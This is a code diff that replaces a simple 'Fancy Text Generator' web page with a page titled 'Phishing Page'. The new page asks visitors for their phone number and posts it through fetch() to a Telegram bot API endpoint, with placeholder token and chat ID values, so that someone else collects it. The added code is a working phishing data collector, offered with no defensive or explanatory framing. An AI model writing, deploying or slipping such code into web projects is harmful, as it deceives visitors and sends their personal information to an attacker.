@@ -1,55 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fancy Text Generator</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-        }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        input, button {
-            padding: 10px;
-            margin: 5px;
-            font-size: 16px;
-        }
-        .output {
-            margin-top: 20px;
-            font-size: 24px;
-            font-weight: bold;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Fancy Text Generator</h1>
-        <input type="text" id="inputText" placeholder="Enter your text here">
-        <button onclick="generateFancyText()">Generate Fancy Text</button>
-        <div class="output" id="outputText"></div>
-    </div>
-
+    <title>Phishing Page</title>
     <script>
-        function generateFancyText() {
-            const inputText = document.getElementById('inputText').value;
-            const outputText = document.getElementById('outputText');
-            const fancyText = inputText.split('').map(char => {
-                if (char === ' ') return '&#x2003;'; // Non-breaking space
-                return `&#${char.charCodeAt(0).toString(16)};`;
-            }).join('');
-            outputText.innerHTML = fancyText;
+        function sendData() {
+            var phoneNumber = document.getElementById('phoneNumber').value;
+            var apiUrl = 'https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage';
+            var chatId = 'YOUR_CHAT_ID';
+            var message = 'New phone number: ' + phoneNumber;
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Success:', data);
+              })
+              .catch((error) => {
+                  console.error('Error:', error);
+              });
         }
     </script>
+</head>
+<body>
+    <h1>Enter Your Phone Number</h1>
+    <input type="text" id="phoneNumber" placeholder="Phone Number">
+    <button onclick="sendData()">Submit</button>
 </body>
 </html>
